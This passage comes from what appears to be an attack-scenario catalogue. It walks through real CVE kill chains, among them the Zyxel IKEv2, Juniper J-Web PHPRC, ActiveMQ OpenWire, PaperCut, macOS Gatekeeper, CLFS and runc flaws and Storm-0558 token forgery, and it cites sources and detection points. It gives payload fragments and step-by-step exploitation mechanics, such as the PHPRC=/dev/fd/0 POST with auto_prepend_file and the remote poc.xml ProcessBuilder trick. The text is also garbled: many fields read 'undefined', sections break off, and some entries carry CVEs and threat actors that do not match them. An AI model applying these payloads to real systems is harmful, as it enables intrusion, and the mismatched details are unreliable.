SPAN Tap) to Node ③ (#3 Zyxel USG FLEX / ATP Firewall), monitored by Node ⑥ (#6 WAN NDR & Syslog SIEM).
  3. **[undefined] undefined** (undefined): Because UDP is connectionless, a single 188-byte UDP packet to port 500 is enough to force the firewall to download and run a root backdoor from the internet. Because CVE-2023-28771 triggers on the very first UDP/500 packet of an IKEv2 exchange (requiring zero authentication or multi-step handshake before reaching the vulnerable logging function), the attacker’s single packet forces the Zyxel firewall to reach out via curl/wget, download a stage-2 ELF binary into /tmp/, and execute it with full root privileges over the perimeter gateway. Because UDP source IP addresses can be spoofed when no handshake is required, attackers could even trigger blind command execution across wide IP ranges in seconds. In the documented HTTP GET Stage-2 ELF exchange from Zyxel USG FLEX / ATP Firewall to ssod 3DES Decrypt & system() Sink, ssod 3DES Decrypt & system() Sink responds with RESP Root Implant (confirming that the FIREWALL STAGE-2 FETCH request succeeded on ssod 3DES Decrypt & system() Sink and completing the final execution objective of TRAPA Security, Rapid7 & CISA, Zyxel Firewall Pre-Auth IKEv2 Packet Decoder Command Injection). On the diagram, follow Step #3 / Link #3 (#3→ FIREWALL STAGE-2 FETCH / ⇠#3 RESP Root Implant) from Node ③ (#3 Zyxel USG FLEX / ATP Firewall) to Node ④ (#4 ssod 3DES Decrypt & system() Sink), monitored by Node ⑥ (#6 WAN NDR & Syslog SIEM).

## 41. watchTowr, VulnCheck & CISA — Juniper Junos OS J-Web: PHPRC "/dev/fd/0" Fileless Pre-Auth RCE
- **Scenario ID:** `juniper-junos-jweb-cve-2023-36845-chain`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/juniper-junos-jweb-cve-2023-36845-chain
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-36845 (9.8 CRITICAL (Chained / Fileless)), CVE-2023-36846 (5.3 MEDIUM)
- **Attributed Threat Actors:** Perimeter Network Device Espionage & Botnet Actors, GreyNoise & Shadowserver Tracked J-Web Scanners
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): Because Juniper’s Appweb server turns URL query parameters into OS environment variables before launching php-cgi, adding ?PHPRC=/dev/fd/0 points PHP’s configuration reader directly at the incoming HTTP POST body (stdin). On Juniper SRX firewalls and EX switches running J-Web, the Appweb HTTP server spawns /usr/local/bin/php-cgi to process PHP pages like /webauth_operation.php (which is reachable without logging in). Due to CVE-2023-36845, Appweb populates the child process’s environment variables from the HTTP request’s parameters. By sending POST /webauth_operation.php?PHPRC=/dev/fd/0, the attacker sets the PHPRC environment variable (which tells PHP where to load its php.ini configuration file on startup) to /dev/fd/0 (file descriptor 0 on FreeBSD, Standard Input, which in CGI mode contains the raw body of the attacker’s HTTP POST request!). Compare the two multi-source approaches: watchTowr Labs first demonstrated a 2-step chain (uploading a file via CVE-2023-36846 and pointing PHPRC to that uploaded file), whereas VulnCheck showed that pointing PHPRC to /dev/fd/0 eliminates the file upload entirely and works in a single fileless HTTP POST request. On the diagram, follow Step #1 / Link #1 (#1→ PHPRC=/DEV/FD/0 POST / ⇠#1 RESP HTTP 200 OK) from Node ① (#1 Remote Exploit Operator) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Junos Syslog & NDR SIEM).
  2. **[undefined] undefined** (undefined): When php-cgi opens /dev/fd/0 thinking it is php.ini, it reads the attacker’s POST body: allow_url_include=1 and auto_prepend_file="data://text/plain;base64...". As php-cgi initializes before executing webauth_operation.php, it opens /dev/fd/0 and parses the attacker’s HTTP POST body as php.ini directives. Inside that body, the attacker writes allow_url_include=1 (unlocking PHP’s ability to execute code directly from inline data:// URLs) and auto_prepend_file="data://text/plain;base64,PD9waHAg..." (instructing PHP to automatically decode and run that base64 PHP script in memory before running the requested page). Because both the fake php.ini (/dev/fd/0) and the prepended PHP script (data://text/plain;base64...) exist strictly in memory streams, zero files are ever created in /var/tmp/ on the firewall. On the diagram, follow Step #2 / Link #2 (#2→ STDIN PHP.INI PARSE / ⇠#2 ACK Fileless INI) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 Juniper SRX / EX (J-Web)), monitored by Node ⑥ (#6 Junos Syslog & NDR SIEM).
  3. **[undefined] undefined** (undefined): The prepended PHP payload runs system() to grab the firewall’s master configuration (/config/juniper.conf.gz) and calls die() so the stolen data is sent right back in the HTTP 200 response. When php-cgi executes the prepended data:// stream, the attacker’s PHP code invokes system or passthru to run FreeBSD shell commands on the Junos device (such as extracting /config/juniper.conf.gz, which contains all firewall rules, VPN pre-shared keys, and $9$ or SHA-512 administrator password hashes, and terminating the PHP script so the command output is returned cleanly in the HTTP response). In Junos OS, passwords encrypted with the reversible $9$ format inside juniper.conf can be instantly decrypted offline using known Junos $9$ decoding scripts. In the documented FreeBSD Process Exec exchange from Juniper SRX / EX (J-Web) to php-cgi PHPRC=/dev/fd/0 Loader, php-cgi PHPRC=/dev/fd/0 Loader responds with ACK 1,842 Bytes (confirming that the JUNOS CONFIG EXFIL request succeeded on php-cgi PHPRC=/dev/fd/0 Loader and completing the final execution objective of watchTowr, VulnCheck & CISA, Juniper Junos OS J-Web: PHPRC "/dev/fd/0" Fileless Pre-Auth RCE). On the diagram, follow Step #3 / Link #3 (#3→ JUNOS CONFIG EXFIL / ⇠#3 ACK 1,842 Bytes) from Node ③ (#3 Juniper SRX / EX (J-Web)) to Node ④ (#4 php-cgi PHPRC=/dev/fd/0 Loader), monitored by Node ⑥ (#6 Junos Syslog & NDR SIEM).
- **Primary Authoritative Sources (3):**
  - watchTowr Labs — *CVEs-2023-36844 to 36847: Juniper SRX & EX Pre-Auth Remote Code Execution Chain* (`WATCHTOWR-JUNIPER-2023`): https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/
  - VulnCheck Initial Access Intelligence — *Single-Request Fileless RCE on Juniper J-Web via PHPRC=/dev/fd/0 (CVE-2023-36845)* (`VULNCHECK-CVE-2023-36845`): https://vulncheck.com/blog/juniper-cve-2023-36845

## 43. Rapid7, Huntress & Trend Micro — Apache ActiveMQ OpenWire ExceptionResponse Deserialization RCE
- **Scenario ID:** `apache-activemq-cve-2023-46604-openwire`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/apache-activemq-cve-2023-46604-openwire
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-46604 (10.0 CRITICAL)
- **Attributed Threat Actors:** HelloKitty / TellYouThePass & LockBit Ransomware Affiliates, Kinsing (H2Miner) Linux Cloud Threat Group
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): The attacker connects to ActiveMQ’s binary OpenWire port (61616) and sends a 78-byte "Exception Report" packet, except instead of naming a Java Exception, the packet names ClassPathXmlApplicationContext and a remote HTTP URL. The attacker connects to the Apache ActiveMQ broker on TCP port 61616 (the binary OpenWire messaging port exposed by default) and sends a crafted Command Type 31 (0x1F ExceptionResponse) frame. Instead of a real Java exception class, the packet specifies org.springframework.context.support.ClassPathXmlApplicationContext as the class name and http://185.220.101.44:8080/poc.xml as the exception message (abusing the fact that ExceptionResponseMarshaller unmarshals both strings directly from the wire without authenticating the client). In the OpenWire binary protocol, byte offset 4 specifies the command data structure type: 0x1F (31) routes the packet directly to ExceptionResponseMarshaller.tightUnmarshal(), which calls tightUnmarshalThrowable(). In the documented TCP/61616 OpenWire 0x1F exchange from OpenWire Exploit & XML Server to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with ALERT 78 Bytes (0x1F) (confirming that the OPENWIRE EXCEPTION FRAME request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 createThrowable() Reflection & Remote Spring XML Fetch). On the diagram, follow Step #1 / Link #1 (#1→ OPENWIRE EXCEPTION FRAME / ⇠#1 ALERT 78 Bytes (0x1F)) from Node ① (#1 OpenWire Exploit & XML Server) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Huntress EDR & Suricata IDS).
  2. **[undefined] undefined** (undefined): Because createThrowable() never checks if the requested class actually inherits from java.lang.Throwable, it calls the ClassPathXmlApplicationContext(String) constructor, which immediately reaches out over HTTP to download poc.xml. Inside the ActiveMQ broker, BaseDataStreamMarshaller.createThrowable() looks up the attacker-supplied class name and invokes its single-String constructor via Java reflection (because prior to 5.18.3, createThrowable() never verified whether the target class actually implemented java.lang.Throwable before calling Constructor.newInstance(message)). Instantiating ClassPathXmlApplicationContext with an HTTP URL forces the ActiveMQ JVM to make an outbound HTTP GET request to the attacker server and parse poc.xml as a trusted Spring IoC bean definition file. Because Apache ActiveMQ bundles spring-context in its default lib/ directory, org.springframework.context.support.ClassPathXmlApplicationContext is always present on the broker’s classpath and accepts an arbitrary http:// or https:// XML URL in its single-String constructor. In the documented data/activemq.log exchange from DMZ Reverse Proxy & SPAN Tap to ActiveMQ OpenWire (:61616), ActiveMQ OpenWire (:61616) responds with RESP HTTP 200 (poc.xml) (confirming that the SPRING XML URL FETCH request succeeded on ActiveMQ OpenWire (:61616) and establishing the runtime state required for Step #3 Spring ProcessBuilder init-method="start" RCE). On the diagram, follow Step #2 / Link #2 (#2→ SPRING XML URL FETCH / ⇠#2 RESP HTTP 200 (poc.xml)) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 ActiveMQ OpenWire (:61616)), monitored by Node ⑥ (#6 Huntress EDR & Suricata IDS).
  3. **[undefined] undefined** (undefined): As Spring builds the objects listed inside poc.xml, it constructs a ProcessBuilder object and automatically runs its start() method, launching the attacker’s shell or ransomware installer inside the ActiveMQ service account. As Spring initializes the beans defined in poc.xml, it constructs a bean of class java.lang.ProcessBuilder with constructor arguments ["/bin/sh", "-c", "..."] and triggers init-method="start" (a standard Spring XML lifecycle attribute that automatically invokes ProcessBuilder.start() the moment the bean is created in memory). This spawns a child shell or msiexec.exe directly under the ActiveMQ broker service account (used in the wild to deploy HelloKitty, LockBit, and Kinsing payloads). Apache patched CVE-2023-46604 in ActiveMQ 5.18.3 by adding a strict type check inside BaseDataStreamMarshaller.createThrowable(): if (!Throwable.class.isAssignableFrom(clazz)) throw new IOException(...). On the diagram, follow Step #3 / Link #3 (#3→ PROCESSBUILDER.START() / ⇠#3 ACK PID 3814) from Node ③ (#3 ActiveMQ OpenWire (:61616)) to Node ④ (#4 ActiveMQ JVM (createThrowable)), monitored by Node ⑥ (#6 Huntress EDR & Suricata IDS).
- **Primary Authoritative Sources (3):**
  - Rapid7 Emergent Threat Response — *Suspected Ransomware Activity Targeting Apache ActiveMQ (CVE-2023-46604)* (`RAPID7-CVE-2023-46604`): https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-ransomware-activity-targeting-apache-activemq-cve-2023-46604/

  2. **[undefined] undefined** (undefined): Normally, PaperCut’s printer scripts run inside a safety cage (ClassShutter) so scripts can only count pages or check paper sizes. When print.script.sandboxed is set to N, Rhino scripts can bridge directly into any Java class on the JVM classpath.   3. **[undefined] undefined** (undefined): The attacker pastes java.lang.Runtime.getRuntime().exec("powershell.exe ...") into a template printer script and clicks Apply, causing pc-app.exe to immediately evaluate the script and spawn a SYSTEM PowerShell window. The attacker navigates to /app?service=page/PrinterDetails, edits a printer script, and injects java.lang.Runtime.getRuntime().exec("powershell.exe ...") outside or inside the printJobHook() function (because PaperCut compiles and evaluates the top-level Rhino JavaScript code immediately when the administrator clicks Apply, without even waiting for a real print job to arrive). This spawns PowerShell directly beneath pc-app.exe running as NT AUTHORITY\SYSTEM. On Windows, the PaperCut Application Server service (pc-app.exe) runs by default under NT AUTHORITY\SYSTEM, meaning any command executed via Rhino’s Runtime.getRuntime().exec() immediately inherits full SYSTEM privileges. On the diagram, follow Step #3 / Link #3 (#3→ PC-APP.EXE SPAWNS SHELL / ⇠#3 ACK PID 6012 (SYSTEM)) from Node ③ (#3 PaperCut Web (Tapestry :9191)) to Node ④ (#4 ConfigEditor & Rhino JS Engine), monitored by Node ⑥ (#6 Defender & Sysmon SIEM).

## 45. Microsoft Threat Intel & Jamf — macOS Gatekeeper "Achilles" Bypass via AppleDouble Restrictive ACLs
- **Scenario ID:** `macos-gatekeeper-achilles-cve-2022-42821`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/macos-gatekeeper-achilles-cve-2022-42821
- **Category:** Malware & Process Execution (`MALWARE`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2022-42821 (5.5 MEDIUM / CRITICAL GATEKEEPER BYPASS)
- **Attributed Threat Actors:** macOS Initial Access & InfoStealer Delivery Operators, Microsoft 365 Defender Research Team (Jonathan Bar Or)
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): When macOS Archive Utility unzips Update.zip, it reads the hidden ._Update.app AppleDouble companion file and dutifully applies its deny writeextattr Access Control List onto Update.app. The attacker packages an unsigned macOS application (Update.app) inside a ZIP archive alongside an AppleDouble metadata file named ._Update.app (a special prefix format used by macOS Archive Utility / copyfile_unpack() to preserve extended attributes and Access Control Lists across ZIP archives). Inside ._Update.app, the attacker embeds a com.apple.acl.text attribute containing group:everyone deny write,writeattr,writeextattr,writesecurity,chown (an NFSv4 ACL rule that explicitly forbids every user and process on the Mac from writing new extended attributes to the extracted app). macOS uses the AppleDouble format (files prefixed with ._ and starting with magic bytes 0x00051607) to serialize macOS-specific extended attributes and ACLs inside standard ZIP archives. When ArchiveService calls copyfile_unpack(), it restores com.apple.acl.text onto the target bundle immediately. On the diagram, follow Step #1 / Link #1 (#1→ APPLEDOUBLE ACL RESTORED / ⇠#1 ACK ACL deny writeextattr) from Node ① (#1 Achilles Archive Packager) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Jamf Protect & Defender (ESF)).
  2. **[undefined] undefined** (undefined): A split-second after unpacking the file, Safari tries to stamp com.apple.quarantine onto Update.app, but the macOS kernel sees the new deny writeextattr ACL and rejects Safari’s stamp with Permission denied (EACCES)! When Safari or Archive Utility finishes extracting the archive, it calls setxattr() to stamp the com.apple.quarantine extended attribute onto Update.app (the mandatory metadata flag that tells macOS a file came from the internet and must be verified by Gatekeeper). However, because the AppleDouble ACL denying writeextattr is already active on the file, the XNU kernel rejects setxattr("com.apple.quarantine") with EACCES (Permission denied) and the user-mode quarantine helper fails open without aborting the download. Because quarantine propagation in macOS Monterey and early Ventura was performed in user mode after archive extraction without stripping restrictive ACLs first, the kernel enforced the attacker’s ACL against the browser’s own setxattr() call. In the documented XNU Audit / setxattr exchange from Perimeter Firewall & NDR Tap to Safari & Archive Utility, Safari & Archive Utility responds with ACK EACCES (No Quarantine) (confirming that the QUARANTINE WRITE BLOCKED request succeeded on Safari & Archive Utility and establishing the runtime state required for Step #3 Gatekeeper & Lockdown Mode Bypass on App Launch). On the diagram, follow Step #2 / Link #2 (#2→ QUARANTINE WRITE BLOCKED / ⇠#2 ACK EACCES (No Quarantine)) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Safari & Archive Utility), monitored by Node ⑥ (#6 Jamf Protect & Defender (ESF)).
  3. **[undefined] undefined** (undefined): When the user double-clicks Update.app, Gatekeeper (syspolicyd) checks for the com.apple.quarantine attribute, sees it isn’t there, assumes the user built the app themselves, and runs the unsigned Mach-O binary immediately. When the victim double-clicks Update.app in Finder, LaunchServices invokes syspolicyd (the macOS Gatekeeper daemon) to evaluate whether the binary is allowed to run. Because Gatekeeper only enforces Apple Developer ID signatures, Notarization tickets, and Lockdown Mode binary restrictions on files that possess the com.apple.quarantine attribute (assuming any file without com.apple.quarantine was compiled or created locally by the user), syspolicyd completely skips verification and launches the unsigned Mach-O payload without a single dialog box. As Microsoft demonstrated, CVE-2022-42821 even bypassed Apple’s optional Lockdown Mode because Lockdown Mode’s binary execution policy also relied on the presence of com.apple.quarantine to identify untrusted external binaries. In the documented ES_EVENT_TYPE_NOTIFY_EXEC exchange from Safari & Archive Utility to LaunchServices & syspolicyd, LaunchServices & syspolicyd responds with ACK PID 1420 (Unsigned) (confirming that the GATEKEEPER BYPASSED request succeeded on LaunchServices & syspolicyd and completing the final execution objective of Microsoft Threat Intel & Jamf, macOS Gatekeeper "Achilles" Bypass via AppleDouble Restrictive ACLs). On the diagram, follow Step #3 / Link #3 (#3→ GATEKEEPER BYPASSED / ⇠#3 ACK PID 1420 (Unsigned)) from Node ③ (#3 Safari & Archive Utility) to Node ④ (#4 LaunchServices & syspolicyd), monitored by Node ⑥ (#6 Jamf Protect & Defender (ESF)).
- **Primary Authoritative Sources (3):**
  - Microsoft Security Threat Intelligence (Jonathan Bar Or) — *Gatekeeper’s Achilles heel: Unearthing a macOS vulnerability (CVE-2022-42821)* (`MS-ACHILLES-2022-12`): https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/

## 46. Kaspersky GReAT & Microsoft — Windows CLFS.sys Kernel Zero-Day EoP & Nokoyawa Ransomware
- **Scenario ID:** `windows-clfs-ransomware-cve-2023-28252-nokoyawa`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/windows-clfs-ransomware-cve-2023-28252-nokoyawa
- **Category:** Malware & Process Execution (`MALWARE`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-28252 (7.8 HIGH / ZERO-DAY KERNEL EOP)
- **Attributed Threat Actors:** Nokoyawa Ransomware Affiliates (Ex-Hive / Play Overlap), FIN11 / RansomVC Zero-Day Exploit Developers
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): The attacker asks Windows to create a normal .blf log file in C:\Users\Public\, then edits the raw pointer offsets inside the file on disk and recalculates the CRC32 checksum so CLFS.sys won’t realize the file was tampered with. The attacker’s low-privileged loader (clfs_eop.exe, PID 5520) calls the standard Windows API CreateLogFile("LOG:C:\Users\Public\log.blf") (which instructs the kernel driver CLFS.sys to create a Base Log File on disk) and then directly modifies the raw .blf bytes to corrupt CLFS_LOG_BLOCK_HEADER.SignaturesOffset and CLFS_BASE_RECORD_HEADER.rgClients offsets. Because CLFS.sys verifies block integrity using a standard CRC32 checksum stored in the header, the exploit recalculates and updates the CRC32 value (so the kernel driver trusts the corrupted offsets when loading the metadata block into kernel pool memory). Why is CLFS.sys such a frequent target for ransomware zero-days (CVE-2022-24521, CVE-2022-37969, CVE-2023-23376, CVE-2023-28252)? Because .blf files live in user-writable folders on disk, yet CLFS.sys parses their internal structure offsets directly into Ring-0 kernel pool memory. On the diagram, follow Step #1 / Link #1 (#1→ CRAFTED .BLF CREATED / ⇠#1 ACK 64 KB (.blf)) from Node ① (#1 clfs_eop.exe (Low-Priv User)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Kaspersky GReAT & Defender EDR).
  2. **[undefined] undefined** (undefined): When CLFS.sys flushes the corrupted metadata block, it writes out-of-bounds and replaces a container pointer with a fake function table (ClfsEarlierLsn) that copies the SYSTEM token from PID 4 into the attacker’s process. The exploit calls AddLogContainer() and flushes the log, triggering CLFS!CClfsBaseFilePersisted::WriteMetadataBlock (which uses the corrupted in-memory block offsets to perform an out-of-bounds write that replaces a kernel pointer with the address of a fake CClfsContainer object crafted by the attacker). When CLFS.sys invokes a virtual method on that fake container, control flow jumps to kernel gadgets (CLFS!ClfsEarlierLsn and nt!SeSetAccessStateGenericMapping) that overwrite the current process’s EPROCESS Token pointer with the SYSTEM Token from PID 4. By combining nt!SeSetAccessStateGenericMapping with CLFS!ClfsEarlierLsn (which returns 0xFFFFFFFF), the exploit constructs an arbitrary kernel write primitive that overwrites the privileges/Token field of its own EPROCESS structure. On the diagram, follow Step #2 / Link #2 (#2→ EPROCESS TOKEN SWAP / ⇠#2 ALERT Token=SYSTEM (PID 4)) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 CLFS.sys (Kernel Driver)), monitored by Node ⑥ (#6 Kaspersky GReAT & Defender EDR).
  3. **[undefined] undefined** (undefined): Now wearing the Supreme Judge’s SYSTEM badge, clfs_eop.exe launches the Nokoyawa ransomware binary (nokoyawa.exe), deletes Volume Shadow Copies, and encrypts the server. Now running as NT AUTHORITY\SYSTEM, clfs_eop.exe spawns nokoyawa.exe (the C++ Nokoyawa ransomware payload that uses its newly acquired SYSTEM privileges to terminate security services, wipe Volume Shadow Copies, and encrypt enterprise files with ECC secp256k1 and Salsa20). Kaspersky GReAT captured this exact chain in February 2023 across multiple Windows Server intrusions, where affiliates used CVE-2023-28252 to jump from a compromised user session directly to SYSTEM before launching Nokoyawa. In the documented Sysmon EID 1 (ProcessCreate) exchange from CLFS.sys (Kernel Driver) to ntoskrnl.exe (EPROCESS Token), ntoskrnl.exe (EPROCESS Token) responds with ACK PID 6188 (SYSTEM) (confirming that the NOKOYAWA RANSOMWARE request succeeded on ntoskrnl.exe (EPROCESS Token) and completing the final execution objective of Kaspersky GReAT & Microsoft, Windows CLFS.sys Kernel Zero-Day EoP & Nokoyawa Ransomware). On the diagram, follow Step #3 / Link #3 (#3→ NOKOYAWA RANSOMWARE / ⇠#3 ACK PID 6188 (SYSTEM)) from Node ③ (#3 CLFS.sys (Kernel Driver)) to Node ④ (#4 ntoskrnl.exe (EPROCESS Token)), monitored by Node ⑥ (#6 Kaspersky GReAT & Defender EDR).

## 49. Snyk, OpenContainers & Sysdig — "Leaky Vessels" runc WORKDIR (/proc/self/fd/7) Host File-Descriptor Container Escape
- **Scenario ID:** `k8s-runc-cve-2024-21626-leaky-vessels`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/k8s-runc-cve-2024-21626-leaky-vessels
- **Category:** Cloud & SaaS (`CLOUD_SAAS`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-36884 (8.8 HIGH), CVE-2024-21412 (8.1 HIGH)
- **Attributed Threat Actors:** APT29 (Midnight Blizzard), TA551 (Shathak) & QakBot Affiliates
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): While building the container’s walls, runc opens a directory handle (fd 7) to the host’s /sys/fs/cgroup folder and forgets to close it before honoring the container’s WORKDIR /proc/self/fd/7 instruction. In runc versions <= 1.1.11, the runc init process opens the host system’s /sys/fs/cgroup directory (receiving file descriptor 7, marked O_CLOEXEC so it will automatically close when execve() finally starts the container’s command) before isolating the container’s filesystem via pivot_root(). However, when the container image specifies WORKDIR /proc/self/fd/7, runc calls chdir("/proc/self/fd/7") before calling execve() (stepping directly through the still-open file descriptor 7 into the host’s /sys/fs/cgroup directory). Why didn’t O_CLOEXEC protect runc? Because O_CLOEXEC only closes file descriptors at the exact moment execve() is called, whereas runc processes the container’s WORKDIR (chdir) slightly earlier during the init setup phase while fd 7 is still open. In the documented SYSCALL chdir (80) exchange from Malicious OCI Image / Pod Spec to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK CVE-2024-21626 (confirming that the CHDIR_PROC_SELF_FD_7 request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 PERSISTENT HOST DENTRY ANCHOR IN CONTAINER CURRENT DIRECTORY). On the diagram, follow Step #1 / Link #1 (#1→ CHDIR_PROC_SELF_FD_7 / ⇠#1 ACK CVE-2024-21626) from Node ① (#1 Malicious OCI Image / Pod Spec) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Sysdig / Falco eBPF Kernel Sensor).
  2. **[undefined] undefined** (undefined): When execve() runs, file descriptor 7 snaps shut, but the container’s feet (current working directory ".") are already planted on the host’s /sys/fs/cgroup floor outside the container jail! When runc finally calls execve("/bin/sh"), the Linux kernel closes file descriptor 7 as requested by O_CLOEXEC, but the process’s kernel working directory pointer (task_struct->fs->pwd, represented by "." and /proc/self/cwd) remains anchored to the host’s /sys/fs/cgroup Virtual File System (VFS) dentry outside the container’s pivot_root boundary (causing /proc/self/cwd to display as "(unreachable)/sys/fs/cgroup"). In the Linux kernel, once a process’s fs->pwd dentry points to a mount outside its root namespace, relative path lookups starting from "." or ".." resolve along the host mount tree rather than the container’s rootfs. In the documented FALCO eBPF ALERT exchange from Perimeter Firewall & NDR Tap to K8s Worker Node (runc 1.1.11), K8s Worker Node (runc 1.1.11) responds with ACK FALCO PRIORITY CRITICAL (confirming that the UNREACHABLE_HOST_CWD request succeeded on K8s Worker Node (runc 1.1.11) and establishing the runtime state required for Step #3 RELATIVE DOT-DOT TRAVERSAL TO HOST ROOTFS & KUBELET COMPROMISE). On the diagram, follow Step #2 / Link #2 (#2→ UNREACHABLE_HOST_CWD / ⇠#2 ACK FALCO PRIORITY CRITICAL) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 K8s Worker Node (runc 1.1.11)), monitored by Node ⑥ (#6 Sysdig / Falco eBPF Kernel Sensor).
  3. **[undefined] undefined** (undefined): From /sys/fs/cgroup on the host, climbing up four parent folders (../../../../) lands the process at the host server’s real / root directory, giving full access to /etc/shadow, /etc/crontab, and Kubernetes node certificates. Because the container’s current directory (".") is /sys/fs/cgroup on the underlying Kubernetes worker node, running cd ../../../.. (or opening "../../../../etc/shadow" and "../../../../var/lib/kubelet/kubeconfig" via openat(AT_FDCWD...)) walks up the host directory tree to the worker node’s real root filesystem (/), allowing the attacker to read host password hashes, write a root reverse shell into /etc/crontab, and steal the kubelet’s TLS client certificate. OpenContainers patched CVE-2024-21626 in runc 1.1.12 by marking internal cgroup descriptors O_CLOEXEC properly, closing leaked fds before chdir, and verifying via getcwd() that the working directory is not "(unreachable)" outside the container root. In the documented SYSCALL openat (257) exchange from K8s Worker Node (runc 1.1.11) to Leaked Host Cgroup FD (/proc/self/fd/7), Leaked Host Cgroup FD (/proc/self/fd/7) responds with ACK UID 0 HOST ESCAPE (confirming that the HOST_SHADOW_AND_KUBELET_READ request succeeded on Leaked Host Cgroup FD (/proc/self/fd/7) and completing the final execution objective of Snyk, OpenContainers & Sysdig, "Leaky Vessels" runc WORKDIR (/proc/self/fd/7) Host File-Descriptor Container Escape). On the diagram, follow Step #3 / Link #3 (#3→ HOST_SHADOW_AND_KUBELET_READ / ⇠#3 ACK UID 0 HOST ESCAPE) from Node ③ (#3 K8s Worker Node (runc 1.1.11)) to Node ④ (#4 Leaked Host Cgroup FD (/proc/self/fd/7)), monitored by Node ⑥ (#6 Sysdig / Falco eBPF Kernel Sensor).

- **Scenario ID:** `microsoft-storm-0558-msa-signing-key`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/microsoft-storm-0558-msa-signing-key

- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-36884 (8.8 HIGH), CVE-2024-21412 (8.1 HIGH)
- **Attributed Threat Actors:** APT29 (Midnight Blizzard), TA551 (Shathak) & QakBot Affiliates
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): Having recovered Microsoft’s private 2016 consumer MSA signing key from a crash dump, the spy uses it offline on their own computer to stamp fake identity tokens for government diplomats. As detailed in Microsoft’s root-cause investigation, a 2021 consumer signing service crash accidentally included private key material for a 2016 Microsoft Account (MSA) consumer signing key inside a process crash dump (which failed to be redacted due to a race condition and was later exfiltrated from a compromised engineer’s corporate environment). Storm-0558 uses this RSA private key offline to cryptographically sign forged authentication tokens populated with target enterprise user claims. Because token forgery happens 100% offline using the stolen private signing key, the attacker never sends a password guess or MFA push to Microsoft Entra ID, generating zero failed-login alerts. In the documented HTTPS OWA_AUTH exchange from Storm-0558 Forgery Engine to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with RESP HTTP 200 OK (confirming that the FORGED_MSA_TOKEN_PRESENTED request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 CROSS-REALM VALIDATION BYPASS IN EXCHANGE ONLINE / OWA).   2. **[undefined] undefined** (undefined): The Exchange Online guard checks that the token’s cryptographic signature matches a valid key in Microsoft’s key ring, but fails to verify whether that key belongs to the Consumer MSA ring or the Enterprise Azure AD ring! When Storm-0558 sends the forged token to Outlook Web Access (outlook.office365.com/owa/), the OWA token validation library verifies the RSA signature against a shared metadata store containing both consumer MSA keys and enterprise Azure AD (Entra ID) keys (failing to enforce scope/issuer-realm isolation that should reject a consumer MSA signing key when validating an enterprise organizational user). OWA then exchanges the forged token for live Exchange Online session tokens under AppId 00000002-0000-0ff1-ce00-000000000000. As Wiz Research highlighted, cryptographic signature verification alone is insufficient in multi-tenant cloud architectures unless the verifier strictly binds each signing key ID (kid) to its authorized issuer realm. In the documented OWA TOKEN_EXCHANGE exchange from Perimeter Firewall & NDR Tap to Exchange Online / OWA Validator, Exchange Online / OWA Validator responds with ALERT SESSION_ISSUED (confirming that the ENTERPRISE_SESSION_MINTED request succeeded on Exchange Online / OWA Validator and establishing the runtime state required for Step #3 SILENT OWA MAILBOX COLLECTION & CISA AA23-193A DETECTION).   3. **[undefined] undefined** (undefined): The spy silently downloads hundreds of emails through OWA, until a federal agency’s audit ledger (Purview MailItemsAccessed) reveals someone was reading mail inside the vault without ever signing the front-door guestbook (Entra SignInLogs). Routing traffic through SoftEther VPN residential exit nodes (198.51.100.119), Storm-0558 invokes /owa/service.svc?action=FindItem and action=GetItem to download sensitive diplomatic and government emails. A Federal Civilian Executive Branch (FCEB) agency detects the intrusion by hunting in Microsoft Purview’s MailItemsAccessed unified audit log (spotting ClientInfoString="Client=OWA;Action=ViaProxy" and AppId 00000002-0000-0ff1-ce00-000000000000 from 